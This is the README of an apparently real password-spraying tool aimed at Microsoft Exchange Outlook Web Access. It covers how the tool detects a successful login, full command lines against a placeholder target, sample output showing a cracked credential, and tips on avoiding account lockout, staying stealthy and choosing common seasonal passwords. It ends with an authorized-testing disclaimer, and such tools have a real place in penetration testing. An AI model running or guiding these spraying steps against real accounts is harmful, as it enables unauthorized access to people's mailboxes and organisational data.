# OWA Spray

A password spraying tool for Microsoft Exchange OWA (Outlook Web Access) with accurate success detection.

## Why This Tool?

Most OWA spray tools use `auth.owaauth.dll`, which **always returns HTTP 440** regardless of credential validity — leading to false positives or missed hits.

This tool uses `auth.owa` with full session handling:
1. GET `/owa/auth/logon.aspx` for session cookies
2. POST credentials to `/owa/auth.owa`
3. Detect success by checking for `cadata` cookie and redirect target

### Detection Logic

| Result  | HTTP Status | Redirect Location              | Cookies Set |
|---------|-------------|--------------------------------|-------------|
| Success | 302         | `/owa/`                        | `cadata` +  |
| Failure | 302         | `/owa/auth/logon.aspx?reason=` | None        |

## Installation

```bash
git clone https://github.com/yourusername/owa-spray.git
cd owa-spray
pip install requests
```

No other dependencies required. Python 3.6+.

## Usage

```bash
# Spray single password across user list
python3 owa_spray.py -t https://mail.target.com -d DOMAIN -u users.txt -P 'Summer2025'

# Spray password list across user list
python3 owa_spray.py -t https://mail.target.com -d DOMAIN -u users.txt -p passwords.txt

# Single user + single password (quick test)
python3 owa_spray.py -t https://mail.target.com -d DOMAIN -U admin -P 'Password1'

# Custom threads, delay, and output file
python3 owa_spray.py -t https://mail.target.com -d DOMAIN -u users.txt -p passwords.txt -T 10 --delay 1 -o hits.txt

# Verbose mode (show all attempts)
python3 owa_spray.py -t https://mail.target.com -d DOMAIN -u users.txt -p passwords.txt -v
```

## Options

| Flag              | Description                          | Default |
|-------------------|--------------------------------------|---------|
| `-t`, `--target`  | Target OWA URL (required)            | -       |
| `-d`, `--domain`  | Domain name (required)               | -       |
| `-u`, `--userfile`| File with usernames                  | -       |
| `-U`, `--user`    | Single username                      | -       |
| `-p`, `--passfile`| File with passwords                  | -       |
| `-P`, `--password`| Single password                      | -       |
| `-T`, `--threads` | Concurrent threads                   | 5       |
| `-o`, `--output`  | Save hits to file                    | -       |
| `--delay`         | Delay between attempts (seconds)     | 0       |
| `-v`, `--verbose` | Show all attempts                    | False   |

## Example Output

```
==================================================
  OWA Password Spray
==================================================
  Target  : https://mail.target.com
  Domain  : CORP
  Users   : 6
  Passwords: 2652
  Combos  : 15912
  Threads : 5
==================================================

  [+] VALID: CORP\ahope:Summer2025
  [1337/15912] 1 hits, 0 errors | 3.2/s | tquinn:Welcome2023

==================================================
  Results
==================================================
  Tested  : 15912
  Hits    : 1
  Errors  : 0
  Time    : 4972.5s
  Rate    : 3.2/s

  Valid Credentials:
    CORP\ahope:Summer2025
==================================================
```

## Tips

- Keep threads at **5-10** to avoid account lockout
- Use `--delay` for lockout-sensitive environments
- Spray **one password at a time** across all users for stealth
- Common OWA password patterns: `Season+Year+!` (e.g., `Summer2025!`)

## Disclaimer

This tool is intended for authorized penetration testing and security assessments only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## License

MIT